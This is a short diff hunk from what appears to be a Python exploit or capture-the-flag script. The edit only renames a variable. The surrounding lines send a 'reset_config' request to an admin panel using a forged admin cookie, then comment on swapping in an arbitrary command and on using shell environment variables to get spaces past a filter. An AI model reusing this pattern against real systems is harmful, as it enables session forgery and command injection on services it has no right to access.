@@ -606,10 +606,10 @@ admin_cookies = {
     "username": ADMIN_COOKIE
 }
 
-trigger_payload = {
+reset_payload = {
     "action": "reset_config"
 }
-resp = requests.post(url+"/panel", data=trigger_payload, cookies=admin_cookies)
+requests.post(url+"/panel", data=reset_payload, cookies=admin_cookies)
 
 # change with the command you want
 # Note: watch out for the use of spaces/shell_envs to add spaces to the command
